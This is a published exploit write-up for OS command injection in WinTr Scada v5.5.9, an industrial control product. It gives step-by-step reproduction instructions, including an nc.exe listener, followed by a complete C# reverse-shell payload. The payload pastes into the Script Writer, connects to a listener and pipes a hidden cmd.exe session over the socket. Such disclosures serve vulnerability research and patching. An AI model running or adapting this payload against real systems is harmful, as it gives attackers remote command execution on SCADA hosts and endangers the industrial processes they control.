---
layout: post
title: WinTr Scada v5.5.9 - OS Command Injection
date: 2024-04-17
category: exploit
---

# Exploit Title: WinTr Scada v5.5.9 - OS Command Injection
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 17.04.2024
# Vendor Homepage: http://www.wintr.com.tr
# Software Link: https://www.fultek.com.tr/Download/WinTrScadaSQL2014x32.zip
# Tested Version: v5.5.9 (latest)
# Tested on: Windows 10 32bit

### Steps to Reproduce

1. Set up a listener on your machine with `nc.exe -vv -l -p 1337`.
2. Open WinTr Scada and click on **New Project**.
3. Click **Yes** to save the project.
4. Close the window that opens after saving.
5. Go to **Script Writer**.
6. Select **CSharp** from the top menu.
7. Paste the payload below and click on **Script Test and Run**.
8. Your reverse shell should now connect to the listener.

### Payload

The following C# payload initiates a reverse shell connection to a specified IP and port (in this example, `127.0.0.1:1337`).

```csharp
using System;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;

namespace WinTr
{
    class MainClass
    {
        StreamWriter streamWriter;

        public void Load()
        {
            try
            {
                TcpClient client = new TcpClient("127.0.0.1", 1337);
                Stream stream = client.GetStream();
                StreamReader rdr = new StreamReader(stream);
                streamWriter = new StreamWriter(stream);

                StringBuilder strInput = new StringBuilder();

                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardInput = true;
                p.StartInfo.RedirectStandardError = true;

                p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                p.Start();
                p.BeginOutputReadLine();

                while (true)
                {
                    strInput.Append(rdr.ReadLine());
                    p.StandardInput.WriteLine(strInput.ToString());
                    strInput.Remove(0, strInput.Length);
                }

                rdr.Close();
                stream.Close();
                client.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
            }
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    streamWriter.WriteLine(outLine.Data);
                    streamWriter.Flush();
                }
                catch (Exception err)
                {
                    // Handle or log the error
                }
            }
        }
    }
}
